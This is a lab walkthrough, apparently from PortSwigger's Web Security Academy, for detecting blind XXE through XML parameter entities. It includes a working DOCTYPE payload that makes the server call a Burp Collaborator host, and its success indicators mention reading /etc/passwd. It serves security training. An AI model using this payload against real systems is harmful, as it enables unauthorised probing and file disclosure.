## Blind XXE with out-of-band interaction via XML parameter entities

**Category:** xxe
**Difficulty:** Unknown

### Description
This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

### Solution Steps
1. Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.
2. Insert the following external entity definition in between the XML declaration and the stockCheck element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated: <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
3. Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

### Key Payloads
- `stockCheck`
- `<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>`

### Indicators of Success
- External entity resolved
- Local file contents returned (/etc/passwd)
- DNS/HTTP callback received (blind XXE)
- DTD fetched from external server
- Error messages reveal file contents
---
*Source: PortSwigger Web Security Academy*
